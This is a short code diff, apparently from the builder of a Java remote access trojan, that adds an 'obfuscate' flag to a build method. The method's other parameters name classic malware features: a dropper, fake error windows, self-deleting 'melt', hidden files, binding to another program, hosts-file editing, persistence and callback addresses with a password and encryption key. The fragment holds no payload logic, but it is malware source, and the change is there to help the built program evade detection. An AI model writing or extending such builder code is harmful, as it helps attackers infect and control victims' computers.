@@ -44,7 +44,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, boolean obfuscate) {
 		listener.start();
 
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
